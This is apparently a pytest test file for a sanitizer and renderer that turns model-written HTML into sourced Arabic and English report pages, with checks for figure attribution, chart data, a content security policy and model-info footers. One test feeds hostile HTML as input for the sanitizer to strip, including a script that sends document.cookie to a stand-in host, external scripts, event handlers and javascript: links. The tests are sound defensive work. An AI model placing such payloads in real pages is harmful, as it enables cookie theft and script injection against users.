"""The report page's building blocks (reports PR, ADR-0380 to ADR-0383): the allowlist sanitizer, the
figure check and the page's frame, sources section and served forms. Pure functions: no service."""

import json
import re
from html.parser import HTMLParser

import pytest

from app.artifacts.config import load_artifacts
from app.artifacts.document import (
    KIT_MARKER,
    Renderer,
    drop_empty,
    editable,
    normalize_data,
    served,
    sources_section,
)
from app.artifacts.figures import FigureLabels, Label, canonical, canonical_number, figures, spans
from app.artifacts.html import Sanitizer, clean_css
from app.settings import _default_config_dir

CONFIG = _default_config_dir()  # <repo>/config in a checkout, the /srv/config mount in the test container
ARTIFACTS = load_artifacts(CONFIG)


TEXT = ARTIFACTS.report.text
KB = Label("kb", "من: اقتصاد الواحة")


def labels_for(allowed: set[str] | None, locale: str = "ar", label: Label = KB) -> FigureLabels:
    """`None`: an unsourced turn, every figure general knowledge. A set: a sourced turn whose one source
    holds the figures of `allowed` (as metadata does, no row or column label needed), any other figure
    not available (ADR-0398)."""
    labels = FigureLabels(
        Label("general", TEXT.general_label.of(locale)),
        sourced=allowed is not None,
        unavailable=Label("unavailable", TEXT.unavailable_label.of(locale)),
    )
    if allowed:
        labels.add([" ".join(sorted(allowed))], label)
    return labels


def build(source: str, locale: str = "ar", allowed: set[str] | None = None, chunk: int = 11, labels: FigureLabels | None = None):
    """The page as the stream renders it, fed in small chunks as a model streams it."""
    sanitizer = Sanitizer()
    renderer = Renderer(locale, labels or labels_for(allowed, locale))
    out = ""
    for start in range(0, len(source), chunk):
        sanitizer.feed_model(source[start : start + chunk])
        out += renderer.render(sanitizer.drain())
    out += renderer.render(sanitizer.finish())
    return out + renderer.end(sources_section([], locale, TEXT, general=True)), renderer


EXTERNAL = re.compile(r"(?i)(https?:)?//[a-z0-9.-]+\.[a-z]{2,}|javascript:|@import|\bon[a-z]+\s*=")


# ------------------------------------------------------------------ sanitizer


def test_scripts_frames_handlers_and_external_urls_never_survive():
    page, _ = build(
        '<!doctype html><html><head><link rel="stylesheet" href="https://cdn.example.com/x.css">'
        '<base href="https://evil.example.com/"><script src="https://evil.example.com/x.js"></script>'
        "<style>@import url(https://e.example.com/a.css); .h{background:url(https://e.example.com/p.png)}"
        " .g{fill:url(#grad)}</style></head>"
        '<body onload="steal()"><a href="https://evil.example.com">رابط</a><a href="javascript:alert(1)">x</a>'
        '<a href="#section-2">داخلي</a><img src="https://e.example.com/i.png" onerror="x()">'
        '<iframe src="https://e.example.com">مخفي<b>لا</b></iframe><object data="x">لا</object>'
        '<svg viewBox="0 0 10 10"><use href="https://e.example.com/s.svg#a"/><image href="https://e.example.com/i"/>'
        '<rect fill="url(https://e.example.com/x)" width="5"/></svg>'
        "<script>fetch('https://e.example.com/'+document.cookie)</script>"
        '<form action="https://e.example.com"><input name="q"></form></body></html>'
    )
    assert not EXTERNAL.search(page), EXTERNAL.search(page)
    assert "<script" not in page.replace('<script type="application/json" id="report-data">', "")
    assert "مخفي" not in page and "steal" not in page
    assert 'href="#section-2"' in page and "url(#grad)" in page


def test_the_platform_writes_the_frame_lang_and_dir_from_the_locale():
    page, _ = build('<html lang="en" dir="ltr"><head><title>لوحة</title></head><body><p>نص</p></body></html>', "ar")
    assert page.startswith(
        '<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8">'
        f'<meta name="viewport" content="width=device-width, initial-scale=1">{KIT_MARKER}<title>'
    )
    english, _ = build("<html><body><p>text</p></body></html>", "en")
    assert english.startswith('<!doctype html><html lang="en" dir="ltr">')
    assert page.count("<body>") == 1 and page.endswith("</body></html>")


def test_text_before_and_after_the_document_is_not_the_page():
    page, _ = build("Here is your dashboard:\n```html\n<!doctype html><html><body><p>نص</p></body></html>\n```\nDone!")
    assert "Here is" not in page and "```" not in page and "Done!" not in page
    assert "<p>نص</p>" in page


def test_the_platforms_marks_cannot_be_forged_by_the_model():
    page, _ = build(
        '<html><body><span class="kit-figure" data-kit="figure" data-kit-source="kb" data-kit-label="من: البنك">١٠</span>'
        '<section class="kit-sources kit-card" data-kit="sources"><h2>المصادر</h2></section></body></html>',
    )
    assert 'class="kit-card"' in page and 'data-kit="sources" lang' in page  # only the platform's own section
    assert "من: البنك" not in page and 'data-kit-source="kb"' not in page
    assert page.count('data-kit-source="general"') == 1  # the figure carries the platform's own label only


def test_css_loses_every_url_but_in_document_references():
    css = clean_css(".a{background:url('https://x.example.com/a.png')} .b{fill:url(#g)} @import 'x.css'; .c{x:expression(1)}")
    assert "x.example.com" not in css and "url(#g)" in css and "@import" not in css and "expression" not in css


def test_the_report_data_block_keeps_charts_only_and_cannot_close_its_script():
    page, _ = build(
        '<html><body><div class="kit-chart" data-chart="g"></div><script type="application/json" id="report-data">'
        '{"charts":{"g":{"type":"line","labels":["2030","2031"],"datasets":[{"label":"النمو <b>","data":[3.1,"x",3.6]}]}},'
        '"script":"alert(1)"}</script><script type="application/json" id="report-data">{"charts":{}}</script></body></html>',
        allowed={"2030", "2031", "3.1", "3.6"},
    )
    block = re.search(r'<script type="application/json" id="report-data">(.*?)</script>', page).group(1)
    data = json.loads(block)
    assert set(data) == {"charts"} and data["charts"]["g"]["datasets"][0]["data"] == [3.1, None, 3.6]
    assert "<" not in block and page.count('id="report-data"') == 1


def test_invalid_report_data_is_an_empty_block():
    assert normalize_data("{not json") == {"charts": {}}
    assert normalize_data('{"charts":{"a":{"type":"weird","labels":[1],"datasets":[{"data":[1e30, true]}]}}}') == {
        "charts": {"a": {"type": "bar", "title": "", "labels": ["1"], "datasets": [{"label": "", "data": [None, None]}]}}
    }


# ------------------------------------------------------------------ figures (D2, I3)


@pytest.mark.parametrize(
    ("raw", "expected"),
    [("1,250", "1250"), ("١٬٢٥٠", "1250"), ("3\u202f872", "3872"), ("1\u00a0419.5", "1419.5"), ("3.60", "3.6"), ("٣٫٦", "3.6"), ("007", "7"), ("2031", "2031"), ("0.50", "0.5")],
)
def test_canonical_figures(raw, expected):
    assert canonical(raw) == expected


def test_a_number_with_no_break_space_separators_is_one_figure():
    # make-eval-20261029T103028Z: the heavy model wrote 3 872 with U+202F, labelled as 3 and 872.
    assert [c for _, _, c in spans("السعة 3\u202f872 جيجاواط، و 2024 300 وحدة")] == ["3872", "2024", "300"]


def test_names_with_digits_are_not_figures():
    found = [c for _, _, c in spans("Q1 و H2 و COVID-19 و 5G و 3D، ثم 18% و 2031م")]
    assert found == ["18", "2031"]


def test_number_words_and_dates_in_the_sources_count():
    allowed = figures(["يستحق العامل إجازة مدتها واحد وعشرون يوما", "نُشر في 2031-07-20"])
    assert {"21", "2031", "7", "20"} <= allowed
    assert canonical_number(3.0) == "3" and canonical_number(2.40) == "2.4"


def mark(raw: str, label: Label) -> str:
    return (f'<span class="kit-figure" data-kit="figure" data-kit-source="{label.kind}" '
            f'data-kit-label="{label.text}" title="{label.text}">{raw}</span>')


GENERAL = Label("general", "من المعرفة العامة")


UNAVAILABLE = Label("unavailable", "غير متوفر")


def test_on_a_sourced_turn_every_figure_is_its_sources_or_not_available():
    page, renderer = build(
        '<html><body><div class="kit-kpi-value">3.6<span class="kit-kpi-unit">%</span></div>'
        "<p>بلغ النمو ٣٫٦ وكان 3.1% قبل عام، والصادرات 1,250 مليون.</p>"
        '<svg viewBox="0 0 9 9"><text x="1">42</text></svg></body></html>',
        allowed={"3.6", "1250"},
    )
    assert renderer.count.total == 5 and renderer.count.general == 0 and renderer.count.unavailable == 2
    assert mark("3.6", KB) in page and mark("٣٫٦", KB) in page and mark("1,250", KB) in page
    # ADR-0398: no general knowledge on a sourced turn; the number and its percent sign give way.
    assert '<span class="kit-figure" data-kit="figure" data-kit-source="unavailable" title="غير متوفر">غير متوفر</span> قبل' in page
    assert "3.1" not in page and "42" not in page and ">غير متوفر</text>" in page
    assert set(renderer.count.sourced) == {"3.6", "1250"} and "من المعرفة العامة" not in page.split("kit-sources")[0]


def test_on_an_unsourced_turn_every_figure_is_general_knowledge_and_nothing_is_matched():
    labels = FigureLabels(Label("general", "General knowledge"), sourced=False)
    labels.add(["inflation 2.2 in July"], Label("kb", "From: Oasis economy"))  # ignored: no findings this turn
    labels.add(["you asked about 12"], Label("message", "From: your request"))
    page, renderer = build("<html><body><p>2.2 and 12 and 99</p></body></html>", "en", labels=labels)
    assert renderer.count.total == 3 and renderer.count.general == 3 and not renderer.count.sourced
    assert "From:" not in page


def test_the_label_names_the_kb_the_file_the_capability_or_the_request():
    labels = FigureLabels(Label("general", "General knowledge"), sourced=True, unavailable=Label("unavailable", "Not available"))
    labels.add(["inflation 2.2 in July"], Label("kb", "From: Oasis economy"))
    labels.add(["the attached file says 2.2 and 7.5"], Label("file", "From: budget.pdf"))
    labels.add(["you asked about 12"], Label("message", "From: your request"))
    assert labels.of("2.2").text == "From: Oasis economy"  # the first source that holds it
    assert labels.of("7.5").text == "From: budget.pdf" and labels.of("12").kind == "message"
    assert labels.of("99").kind == "unavailable"
    page, _ = build("<html><body><p>2.2 and 7.5</p></body></html>", "en", labels=labels)
    assert mark("2.2", Label("kb", "From: Oasis economy")) in page


def test_a_passage_figure_counts_only_with_its_row_or_column_label_in_the_same_passage():
    """ADR-0399: the number and its label in the same chunk; a coincidental match elsewhere is not one."""
    labels = FigureLabels(GENERAL, sourced=True, unavailable=UNAVAILABLE)
    labels.add(["معدل البطالة للسعوديين 7.1 في الربع الثاني"], KB, passage=True)
    labels.add(["عدد المشتركين في التأمينات 16 ألفًا"], KB, passage=True)
    assert labels.of("7.1", ["معدل البطالة"]) == KB
    assert labels.of("16", ["عدد أهداف الهلال"]) == UNAVAILABLE  # the number, but not its label
    assert labels.of("16", []) == UNAVAILABLE
    # A label translated from the passage's language (ADR-0396) cannot match word for word.
    assert labels.of("7.1", ["Unemployment rate"]) == KB
    page, _ = build(
        "<html><body><table><thead><tr><th>المؤشر</th><th>البطالة</th></tr></thead>"
        "<tbody><tr><td>الربع الثاني</td><td>7.1</td></tr><tr><td>الأهداف</td><td>16</td></tr></tbody></table>"
        '<div class="kit-kpi-label">البطالة</div><div class="kit-kpi-value">7.1</div></body></html>',
        labels=labels,
    )
    assert page.count(mark("7.1", KB)) == 2 and ">غير متوفر</span>" in page and ">16<" not in page


def test_a_figure_split_between_stream_chunks_is_checked_whole():
    page, renderer = build("<html><body><p>القيمة 1,234,567 ريال</p></body></html>", chunk=3)
    assert mark("1,234,567", GENERAL) in page
    assert renderer.count.general_figures == ["1234567"]


def test_chart_points_and_labels_carry_their_sources_by_the_same_rule():
    page, renderer = build(
        '<html><body><script type="application/json" id="report-data">{"charts":{"g":{"type":"bar",'
        '"labels":["2030","2031"],"datasets":[{"label":"x","data":[3.1,3.6]}]}}}</script></body></html>',
        allowed={"2031", "3.6"},
    )
    assert renderer.count.unavailable == 2 and renderer.count.general == 0
    data = json.loads(re.search(r'id="report-data">(.*?)</script>', page).group(1))["charts"]["g"]
    assert data["labels"] == ["غير متوفر", "2031"] and data["label_sources"] == ["غير متوفر", KB.text]
    # ADR-0398: a point the findings do not hold is dropped, never drawn as general knowledge.
    assert data["datasets"][0]["data"] == [None, 3.6] and data["datasets"][0]["unavailable"] == [0]
    assert data["datasets"][0]["sources"] == ["غير متوفر", KB.text] and "general" not in data["datasets"][0]


def test_a_chart_point_is_matched_with_its_category_and_its_series():
    labels = FigureLabels(GENERAL, sourced=True, unavailable=UNAVAILABLE)
    labels.add(["المشتغلون الذكور 9.2 مليون والإناث 4.1 مليون"], KB, passage=True)
    page, _ = build(
        '<html><body><script type="application/json" id="report-data">{"charts":{"g":{"type":"pie",'
        '"labels":["الذكور","الإناث","الهلال"],"datasets":[{"label":"العاملون","data":[9.2,4.1,4.1]}]}}}</script></body></html>',
        labels=labels,
    )
    data = json.loads(re.search(r'id="report-data">(.*?)</script>', page).group(1))["charts"]["g"]["datasets"][0]
    assert data["data"] == [9.2, 4.1, None] and data["sources"] == [KB.text, KB.text, "غير متوفر"]


def test_the_model_cannot_write_the_platforms_chart_labels():
    _, renderer = build(
        '<html><body><script type="application/json" id="report-data">{"charts":{"g":{"labels":["a"],'
        '"label_sources":["من: البنك"],"datasets":[{"data":[5],"sources":["من: البنك"],"general":[]}]}}}</script></body></html>'
    )
    assert renderer.count.general_figures == ["5"]


# ------------------------------------------------------------------ the sources section and the served forms


def test_the_sources_section_names_kb_title_publisher_date_and_pages_in_western_digits():
    citation = {"id": "d1", "title": "آفاق اقتصاد الواحة - يوليو 2031", "kb_name": {"ar": "اقتصاد الواحة", "en": "Oasis economy"},
                "publisher": "صندوق الواحة للنقد", "published_on": "2031-07-20", "pages": [2, 3]}
    section = sources_section([citation], "ar", TEXT, general=True)
    assert "<h2>المصادر</h2>" in section
    assert "اقتصاد الواحة › آفاق اقتصاد الواحة - يوليو 2031 — صندوق الواحة للنقد — 2031-07-20 — ص 2, 3" in section
    assert "«من المعرفة العامة»" in section
    english = sources_section([], "en", TEXT, general=True)
    assert "<h2>Sources</h2>" in english and 'dir="ltr"' in english


def test_the_view_links_the_kit_from_its_path_and_the_download_inlines_it():
    page, _ = build("<html><body><p>x</p></body></html>")
    view = served(page, ARTIFACTS.kit, form="view", kit_base="http://localhost:8080/report-kit/v1/")
    assert '<link rel="stylesheet" href="http://localhost:8080/report-kit/v1/kit.css">' in view
    assert '<script src="http://localhost:8080/report-kit/v1/kit.js" defer></script>' in view
    download = served(page, ARTIFACTS.kit, form="download")
    # Opened offline from a file: nothing to fetch, and a policy of its own that runs the kit's scripts only.
    assert not re.search(r"""(?:src|href)\s*=\s*["']?(?:https?:)?//""", download)
    assert not re.search(r"url\(\s*['\"]?(?:https?:)?//", download)
    assert "data:font/woff2;base64," in download and KIT_MARKER not in download
    csp = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', download).group(1)
    assert "connect-src 'none'" in csp and "'unsafe-inline'" not in csp.split("script-src", 1)[1].split(";")[0]
    assert len(re.findall(r"'sha256-", csp)) == len(ARTIFACTS.kit.scripts)


def test_an_inlined_kit_script_cannot_close_its_element():
    for _, source in ARTIFACTS.kit.scripts:
        assert "</script" not in source.lower()


def test_the_stored_page_parses_and_editable_strips_the_platforms_marks():
    page, _ = build("<html><body><p>القيمة 5</p></body></html>")
    HTMLParser().feed(page)  # the stdlib parser accepts it
    clean = editable(page)
    assert "kit-figure" not in clean and "kit-sources" not in clean and "القيمة 5" in clean


# ------------------------------------------------------------------ the script check (owner decision D, ADR-0390)


def test_the_script_check_reads_the_text_the_attributes_and_report_data():
    from app.artifacts.stream import visible_text
    from app.artifacts.writer import script_failure
    from app.text.script import ScriptPolicy

    arabic = ScriptPolicy(letters=["ARABIC", "LATIN"])
    sanitizer = Sanitizer()
    sanitizer.feed_model(
        '<html><body><p>أندريه في拉斯 و <bdi>GDP</bdi></p><div title="عنوان">x</div>'
        '<script type="application/json" id="report-data">{"charts":{"g":{"labels":["2031"],'
        '"datasets":[{"label":"增长","data":[1]}]}}}</script></body></html>'
    )
    pieces = sanitizer.drain() + sanitizer.finish()
    failure = script_failure(visible_text(pieces), arabic)
    assert failure == {"issues": ["disallowed_script", "mixed_script_token"], "tokens": ["في拉斯", "增长"]}
    assert script_failure("لوحة النمو في <bdi>Riyadh</bdi> 2031", arabic) is None
    assert script_failure("في拉斯", None) is None  # a locale without a policy (English) is not checked


# ------------------------------------------------------------------ the model strip (owner decision C, ADR-0391)


def test_the_profile_chooses_whether_reports_show_the_model_strip():
    assert load_artifacts(CONFIG, "development").show_model_info is True
    assert load_artifacts(CONFIG, "production").show_model_info is False
    assert load_artifacts(CONFIG).show_model_info is False  # production unless the deployment says otherwise


def test_the_model_strip_names_each_call_and_is_removed_when_not_shown():
    from app.artifacts.document import ModelCall, model_strip, without_model_info

    calls = [
        ModelCall("كتابة التقرير", "openrouter/google/gemma-4-26b-a4b-it", "heavy", 38.24, 12345, 4321),
        ModelCall("نتائج: الاتجاهات", None, "fast", 1.0, 900, 40),
    ]
    strip = model_strip(calls, "ar", TEXT.model_info)
    assert strip.startswith('<footer class="kit-model-info" data-kit="model-info" lang="ar" dir="rtl">')
    for cell in ("google/gemma-4-26b-a4b-it", "openrouter", "heavy", "38.2 ث", "12,345 / 4,321", "غير معروف", "fast"):
        assert f"<bdi>{cell}</bdi>" in strip, cell
    page, _ = build("<html><body><p>القيمة 5</p></body></html>")
    shown = page.replace("</body></html>", strip + "</body></html>")
    assert without_model_info(shown) == page and "kit-model-info" not in editable(shown)
    # The download carries it as the stored page does; the model cannot forge one.
    assert "kit-model-info" in served(shown, ARTIFACTS.kit, form="download")
    forged, _ = build('<html><body><footer class="kit-model-info" data-kit="model-info"><p>x</p></footer></body></html>')
    assert 'class="kit-model-info"' not in forged


def test_the_strip_lists_the_writers_call_then_each_call_that_produced_findings():
    from types import SimpleNamespace

    from app.artifacts.writer import model_calls
    from app.models.gateway import ModelResult

    def result(alias: str, seconds: float) -> ModelResult:
        return ModelResult(text="", tier=alias, served_model=f"openrouter/m-{alias}", tokens_in=10, tokens_out=2,
                           usage_reported=True, alias=alias, duration_s=seconds)

    from app.capabilities.contract import Localized

    manifest = SimpleNamespace(name=Localized(ar="الاتجاهات والمسارات", en="Directions and routes"))
    ctx = SimpleNamespace(
        finding_calls=[("directions", result("fast", 1.5))],
        services=SimpleNamespace(registry=SimpleNamespace(get=lambda slug: SimpleNamespace(manifest=manifest))),
    )
    calls = model_calls(ctx, result("heavy", 40.0), "ar", TEXT)
    assert [(c.label, c.alias, c.duration_s) for c in calls] == [
        ("كتابة التقرير", "heavy", 40.0), ("نتائج: الاتجاهات والمسارات", "fast", 1.5)
    ]
    assert calls[0].provider_and_model == ("openrouter", "m-heavy")


def test_the_table_of_the_item_6_run_matches_by_series_and_chart_title_across_word_forms():
    """Table 1 of the Q2 2026 labour bulletin: «سعودي» rows, a chart of «سعوديون» and the total series under a
    chart titled «معدل البطالة» (the item 6 run marked these «غير متوفر», ADR-0399)."""
    labels = FigureLabels(GENERAL, sourced=True, unavailable=UNAVAILABLE)
    labels.add(["المؤشرات الربع الثاني 2025 الربع الاول 2026 معدل البطالة 2.0 8.7 3.2 2.2 7.2 3.1 "
                "سعودي 4.3 11.3 6.8 4.9 9.0 6.4"], KB, passage=True)
    page, _ = build(
        '<html><body><script type="application/json" id="report-data">{"charts":{"u":{"type":"line",'
        '"title":"معدل البطالة (%)","labels":["الربع الثاني 2025","الربع الأول 2026"],"datasets":['
        '{"label":"الإجمالي","data":[3.2,3.1]},{"label":"سعوديون","data":[6.8,6.4]}]}}}</script></body></html>',
        labels=labels,
    )
    data = json.loads(re.search(r'id="report-data">(.*?)</script>', page).group(1))["charts"]["u"]["datasets"]
    assert [d["data"] for d in data] == [[3.2, 3.1], [6.8, 6.4]] and all("unavailable" not in d for d in data)


def test_a_workbooks_precise_figure_matches_the_page_rounded_to_one_or_two_decimals():
    """ADR-0404: Table 3-1 of the Q2 2026 workbook states 83.60299013 and 16.39700987; a page writes 83.6."""
    assert {"83.6", "16.4", "66.37", "66.4"} <= figures(["83.60299013 | 16.39700987 | 66.366373"])
    assert "3.7" not in figures(["3.65"])  # two decimals or fewer: no rounding
    labels = FigureLabels(GENERAL, sourced=True, unavailable=UNAVAILABLE)
    labels.add(["التوزيع النسبي للمشتغلين بحسب الجنسية و الجنس الذكور الاناث 83.60299013 16.39700987"], KB, passage=True)
    page, _ = build(
        '<html><body><script type="application/json" id="report-data">{"charts":{"g":{"type":"doughnut",'
        '"title":"توزيع المشتغلين حسب الجنس","labels":["الذكور","الإناث"],"datasets":[{"label":"الإجمالي",'
        '"data":[83.6,16.4]}]}}}</script></body></html>',
        labels=labels,
    )
    data = json.loads(re.search(r'id="report-data">(.*?)</script>', page).group(1))["charts"]["g"]["datasets"][0]
    assert data["data"] == [83.6, 16.4] and data["sources"] == [KB.text, KB.text]


def _kept(source: str, labels: FigureLabels) -> str:
    sanitizer = Sanitizer()
    sanitizer.feed_model(source)
    pieces = sanitizer.drain() + sanitizer.finish()
    probe = Renderer("ar", labels)
    probe.render(pieces)
    renderer = Renderer("ar", labels)
    return renderer.render(drop_empty(pieces, probe))


def test_a_chart_or_table_with_nothing_available_leaves_the_page_and_one_with_gaps_stays():
    """Owner decision 3 on PR #17 (ADR-0405), with the kit card around the one that leaves."""
    labels = FigureLabels(GENERAL, sourced=True, unavailable=UNAVAILABLE)
    labels.add(["معدل البطالة 3.0 و 6.5"], KB, passage=True)
    page = _kept(
        '<html><body>'
        '<div class="kit-card"><h3>البطالة</h3><div class="kit-chart" data-chart="u"></div></div>'
        '<div class="kit-card"><h3>المهن</h3><div class="kit-chart" data-chart="o"></div></div>'
        '<div class="kit-card"><table><tr><th>المؤشر</th><th>البطالة</th></tr><tr><td>الإجمالي</td><td>3.0</td></tr>'
        '<tr><td>السعوديون</td><td>9.9</td></tr></table></div>'
        '<div class="kit-card" id="gone"><table><tr><th>المهنة</th><th>النسبة</th></tr><tr><td>المديرون</td><td>4.7</td></tr></table></div>'
        '<script type="application/json" id="report-data">{"charts":{'
        '"u":{"type":"line","title":"معدل البطالة","labels":["أ","ب"],"datasets":[{"label":"الإجمالي","data":[3.0,1.1]}]},'
        '"o":{"type":"bar","title":"المهن","labels":["المديرون"],"datasets":[{"label":"النسبة","data":[18.7]}]}}}</script>'
        "</body></html>",
        labels,
    )
    assert 'data-chart="u"' in page and 'data-chart="o"' not in page and "<h3>المهن</h3>" not in page
    data = json.loads(re.search(r'id="report-data">(.*?)</script>', page).group(1))["charts"]
    assert set(data) == {"u"} and data["u"]["datasets"][0]["data"] == [3.0, None]  # gaps stay, shown
    assert "9.9" not in page and ">غير متوفر</span>" in page  # the table with a gap stays
    assert 'id="gone"' not in page and "4.7" not in page and "المديرون" not in page


def test_nothing_leaves_a_general_knowledge_page():
    labels = FigureLabels(GENERAL, sourced=False)
    page = _kept('<html><body><div class="kit-chart" data-chart="o"></div><script type="application/json" id="report-data">'
                 '{"charts":{"o":{"labels":["a"],"datasets":[{"label":"x","data":[null]}]}}}</script></body></html>', labels)
    assert 'data-chart="o"' in page

